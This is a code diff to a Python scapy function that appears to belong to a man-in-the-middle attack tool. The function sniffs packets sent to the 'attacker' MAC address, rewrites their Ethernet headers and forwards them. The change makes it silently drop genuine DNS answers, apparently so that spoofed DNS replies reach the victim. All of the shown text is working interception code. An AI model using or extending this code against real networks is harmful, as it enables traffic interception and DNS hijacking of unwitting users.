@@ -2,6 +2,7 @@
 from threading import Lock
 
 # Additional libraries
+from scapy import packet
 from scapy.arch import get_if_hwaddr, get_if_addr
 from scapy.layers.dns import DNS
 from scapy.layers.inet import IP
@@ -19,14 +20,14 @@ def forward(interface: str, settings: dict):
     attacker_mac = get_if_hwaddr(interface)
     attacker_ip = get_if_addr(interface)
 
-    def send_forward(received_packet):
+    def send_forward(received_packet: packet):
         received_packet[Ether].src = attacker_mac
         lock.acquire()
         received_packet[Ether].dst = get_mac_by_ip(received_packet[IP].dst, hosts_dictionary)
         lock.release()
         sendp(received_packet, iface=interface, verbose=settings['show debug'])
 
-    def check_forward(received_packet):
+    def check_forward(received_packet: packet):
         if received_packet[Ether].dst != attacker_mac:
             return
         if received_packet[IP].dst == attacker_ip:
@@ -37,8 +38,9 @@ def forward(interface: str, settings: dict):
             if DNS in received_packet:
                 if received_packet[DNS].qr == 1 and received_packet[DNS].ancount > 0:
                     if settings['show selective forward block']:
-                        print('Forwarded package from ' + received_packet[IP].src + ' to ' + received_packet[IP].dst)
-        send_forward(received_packet)
+                        print('Did not forwarded package from ' + received_packet[IP].src + ' to ' + received_packet[IP].dst)
+                    return
+            send_forward(received_packet)
 
     while not settings['interrupted']:
-        sniff(iface=interface, prn=check_forward, filter='ip', store=0)
+        sniff(iface=interface, prn=check_forward, filter='ip', store=0, timeout=1)
